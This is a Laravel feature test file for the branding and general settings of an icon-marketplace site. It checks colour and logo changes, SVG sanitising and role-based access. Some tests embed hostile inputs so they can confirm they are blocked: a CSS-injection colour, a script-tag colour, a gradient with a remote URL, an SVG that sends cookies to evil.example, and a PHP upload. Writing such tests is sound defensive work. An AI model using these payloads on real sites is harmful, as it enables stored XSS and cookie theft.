<?php

namespace Tests\Feature;

use App\Models\User;
use App\Services\Settings\SettingsService;
use Database\Seeders\RolePermissionSeeder;
use Database\Seeders\SettingsSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Tests\TestCase;

/**
 * Global branding and site settings — brief §2, §30.
 *
 * The acceptance criterion is that an administrator can change Iconors
 * colours and logos globally without editing source. These tests check the
 * change actually reaches the rendered page, not merely the database.
 */
class BrandingSettingsTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed(RolePermissionSeeder::class);
        $this->seed(SettingsSeeder::class);
        Storage::fake('public');
    }

    // ---------------------------------------------------------------
    // Colours
    // ---------------------------------------------------------------

    public function test_changing_the_primary_colour_restyles_the_public_site(): void
    {
        $this->actingAs($this->admin())
            ->post(route('admin.settings.branding'), $this->brandingPayload([
                'brand_primary' => '#FF6B00',
            ]))
            ->assertSessionHasNoErrors();

        // The whole point of brief §2: no rebuild, no deploy.
        $this->get(route('home'))->assertSee('--ico-primary:#FF6B00', false);
    }

    public function test_an_invalid_colour_is_rejected(): void
    {
        $this->actingAs($this->admin())
            ->post(route('admin.settings.branding'), $this->brandingPayload([
                'brand_primary' => 'red; } body { display:none } /*',
            ]))
            ->assertSessionHasErrors('brand_primary');

        $this->assertSame('#3CF7A2', app(SettingsService::class)->get('brand_primary'));
    }

    /**
     * The emitted block cannot be Blade-escaped and still function as CSS,
     * so validation upstream is the only thing preventing stored XSS here.
     */
    public function test_a_hostile_colour_never_reaches_the_style_block(): void
    {
        $this->actingAs($this->admin())->post(route('admin.settings.branding'), $this->brandingPayload([
            'brand_accent' => '#000</style><script>alert(1)</script>',
        ]));

        $response = $this->get(route('home'));
        $response->assertDontSee('<script>alert(1)</script>', false);
        $response->assertDontSee('</style><script', false);
    }

    public function test_the_label_colour_is_recalculated_from_the_chosen_primary(): void
    {
        // A light primary must pair with near-black text…
        $this->actingAs($this->admin())->post(route('admin.settings.branding'), $this->brandingPayload([
            'brand_primary' => '#3CF7A2',
        ]));
        $this->get(route('home'))->assertSee('--ico-on-primary:#040408', false);

        // …and a dark one with white. Nobody has to pick this by hand,
        // so a colour change cannot break WCAG contrast.
        $this->actingAs($this->admin())->post(route('admin.settings.branding'), $this->brandingPayload([
            'brand_primary' => '#1E0046',
        ]));
        $this->get(route('home'))->assertSee('--ico-on-primary:#FFFFFF', false);
    }

    public function test_a_low_contrast_primary_warns_but_is_still_allowed(): void
    {
        $this->actingAs($this->admin())
            ->post(route('admin.settings.branding'), $this->brandingPayload([
                'brand_primary'       => '#FAFAFA',
                'brand_surface_color' => '#FFFFFF',
            ]))
            ->assertSessionHasNoErrors()
            ->assertSessionHas('warning');
    }

    public function test_only_a_plain_hex_gradient_is_accepted(): void
    {
        $this->actingAs($this->admin())->post(route('admin.settings.branding'), $this->brandingPayload([
            'brand_gradient' => 'linear-gradient(-135deg, #1E0046, #1E0064)',
        ]));
        $this->get(route('home'))->assertSee('--ico-gradient-signature:linear-gradient', false);

        // A gradient carrying a remote fetch must not be emitted at all.
        $this->actingAs($this->admin())->post(route('admin.settings.branding'), $this->brandingPayload([
            'brand_gradient' => 'linear-gradient(#fff, url(https://evil.example/x))',
        ]));
        $this->get(route('home'))->assertDontSee('evil.example', false);
    }

    // ---------------------------------------------------------------
    // Logos
    // ---------------------------------------------------------------

    public function test_an_uploaded_logo_is_stored_and_rendered(): void
    {
        $this->actingAs($this->admin())
            ->post(route('admin.settings.branding'), $this->brandingPayload([
                'logo_main' => UploadedFile::fake()->image('logo.png', 240, 60),
            ]))
            ->assertSessionHasNoErrors();

        $path = app(SettingsService::class)->get('logo_main');

        $this->assertNotNull($path);
        Storage::disk('public')->assertExists($path);

        $this->get(route('home'))->assertSee($path, false);
    }

    /**
     * Logos are very often SVG, and an SVG is an executable document shown
     * on EVERY page including the admin. An unsanitised one would be stored
     * XSS across the entire site — the highest-impact placement possible.
     */
    public function test_an_svg_logo_is_sanitised_before_storage(): void
    {
        $hostile = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 40 40">'
                 .'<script>fetch("https://evil.example?c="+document.cookie)</script>'
                 .'<rect width="40" height="40" onload="steal()" fill="#3CF7A2"/></svg>';

        $this->actingAs($this->admin())->post(route('admin.settings.branding'), $this->brandingPayload([
            'logo_main' => $this->svgUpload($hostile),
        ]));

        $path  = app(SettingsService::class)->get('logo_main');
        $bytes = Storage::disk('public')->get($path);

        $this->assertStringNotContainsString('script', $bytes);
        $this->assertStringNotContainsString('onload', $bytes);
        $this->assertStringNotContainsString('evil.example', $bytes);
        // …but the actual artwork survives.
        $this->assertStringContainsString('<rect', $bytes);
    }

    public function test_an_executable_file_cannot_be_uploaded_as_a_logo(): void
    {
        $this->actingAs($this->admin())
            ->post(route('admin.settings.branding'), $this->brandingPayload([
                'logo_main' => UploadedFile::fake()->create('payload.php', 10, 'application/x-php'),
            ]))
            ->assertSessionHasErrors('logo_main');
    }

    public function test_submitting_without_a_logo_keeps_the_existing_one(): void
    {
        $admin = $this->admin();

        $this->actingAs($admin)->post(route('admin.settings.branding'), $this->brandingPayload([
            'logo_main' => UploadedFile::fake()->image('logo.png'),
        ]));

        $original = app(SettingsService::class)->get('logo_main');
        $this->assertNotNull($original);

        // Editing only a colour must not wipe the logo.
        $this->actingAs($admin)->post(route('admin.settings.branding'), $this->brandingPayload([
            'brand_primary' => '#123456',
        ]));

        $this->assertSame($original, app(SettingsService::class)->get('logo_main'));
    }

    // ---------------------------------------------------------------
    // General settings
    // ---------------------------------------------------------------

    public function test_the_site_name_change_appears_across_the_site(): void
    {
        $this->actingAs($this->admin())
            ->post(route('admin.settings.general'), $this->generalPayload([
                'site_name' => 'Pixel Foundry',
            ]))
            ->assertSessionHasNoErrors();

        $this->get(route('home'))->assertSee('Pixel Foundry', false);
    }

    public function test_enabling_maintenance_mode_warns_the_administrator(): void
    {
        $this->actingAs($this->admin())
            ->post(route('admin.settings.general'), $this->generalPayload([
                'maintenance_mode' => '1',
            ]))
            ->assertSessionHas('warning');
    }

    public function test_switching_registration_off_persists(): void
    {
        $payload = $this->generalPayload();
        unset($payload['registration_enabled']);   // unticked switch

        $this->actingAs($this->admin())->post(route('admin.settings.general'), $payload);

        $this->assertFalse((bool) app(SettingsService::class)->get('registration_enabled'));
    }

    // ---------------------------------------------------------------
    // Authorisation
    // ---------------------------------------------------------------

    public function test_only_users_with_branding_permission_may_change_branding(): void
    {
        foreach (['Free Customer', 'Contributor', 'Support Agent', 'Asset Reviewer'] as $role) {
            $user = User::factory()->create();
            $user->assignRole($role);

            $this->actingAs($user)->get(route('admin.settings.branding'))->assertForbidden();
            $this->actingAs($user)
                ->post(route('admin.settings.branding'), $this->brandingPayload())
                ->assertForbidden();
        }
    }

    public function test_a_content_editor_cannot_change_general_settings(): void
    {
        $user = User::factory()->create();
        $user->assignRole('Content Editor');

        $this->actingAs($user)->get(route('admin.settings.general'))->assertForbidden();
    }

    // ---------------------------------------------------------------
    // Fixtures
    // ---------------------------------------------------------------

    private function admin(): User
    {
        $user = User::factory()->create();
        $user->assignRole('Super Administrator');

        return $user;
    }

    private function svgUpload(string $contents): UploadedFile
    {
        $path = tempnam(sys_get_temp_dir(), 'logo').'.svg';
        file_put_contents($path, $contents);

        return new UploadedFile($path, 'logo.svg', 'image/svg+xml', null, true);
    }

    private function brandingPayload(array $overrides = []): array
    {
        return array_merge(['brand_primary' => '#3CF7A2'], $overrides);
    }

    private function generalPayload(array $overrides = []): array
    {
        return array_merge([
            'site_name'                     => 'Iconors',
            'site_tagline'                  => 'All Your Creative Assets in One Place',
            'site_description'              => 'Download high-quality icons, animations and stickers.',
            'admin_email'                   => 'admin@iconors.com',
            'support_email'                 => 'support@iconors.com',
            'default_currency'              => 'USD',
            'default_locale'                => 'en',
            'timezone'                      => 'UTC',
            'registration_enabled'          => '1',
            'contributor_applications_open' => '1',
            '_fields'                       => 'registration_enabled,contributor_applications_open,maintenance_mode',
        ], $overrides);
    }
}
